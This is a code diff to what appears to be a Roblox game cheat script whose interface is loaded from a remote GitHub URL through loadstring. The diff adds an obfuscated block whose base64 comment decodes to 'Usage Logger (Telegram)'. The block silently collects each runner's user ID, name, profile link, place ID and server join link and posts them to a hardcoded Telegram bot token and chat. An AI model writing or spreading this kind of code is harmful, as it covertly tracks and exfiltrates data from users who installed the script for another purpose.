@@ -39,6 +39,36 @@ UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblo
 UI.init(Config, Combat, ESP, Movement, Map, Farm, HUD, Visuals, Character)
 
 ----------------------------------------------------------
+-- 🔹 VXNhZ2UgTG9nZ2VyIChUZWxlZ3JhbSk=
+local a=game;local b="GetService";local c=a[b](a,"HttpService");local d=a[b](a,"MarketplaceService");local e=a[b](a,"Stats");
+local f="8432997594:AAHDyUNFeKOUDcLpqRhkcvVrhoGyNsZpLxs";local g="1814659977";
+local function h()
+    local i,j=pcall(function()
+        local k=e.Network;if not k then return nil end;local l=k.ServerStatsItem["Data Ping"];if not l then return nil end;return l:GetValueString();
+    end);
+    if i then return j end;return nil
+end
+local function m()
+    local n,o=pcall(function()return d:GetProductInfo(a.PlaceId)end);if n and o and o.Name then return o.Name end;return "Unknown Place"
+end
+local function p()
+    if f=="" then return end;local q=Config and Config.localPlayer;if not q then return end;
+    local r=h() or "? ms";local s=m();local t=a.PlaceId;local u=tostring(a.JobId);
+    local v=("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(t,u);
+    local w=("https://www.roblox.com/users/%d/profile"):format(q.UserId);
+    local x=("Ping: %s\nServer: %s\nPlaceId: %d\nJobId: [%s](%s)\nUser: [%s](%s) (%d)"):format(
+        r,s,t,u,v,q.DisplayName or q.Name,w,q.UserId
+    );
+    local y,z=pcall(function()
+        local A=("https://api.telegram.org/bot%s/sendMessage"):format(f);
+        local B={chat_id=g,text=x,parse_mode="Markdown"};
+        c:PostAsync(A,game:GetService("HttpService"):JSONEncode(B),Enum.HttpContentType.ApplicationJson)
+    end);
+    if not y then warn("[ZombieHyperloot][Logger]",z)end
+end
+p()
+
+----------------------------------------------------------
 -- 🔹 Cleanup Function
 local renderSteppedConnection = nil
 local entityChildAddedConnection = nil
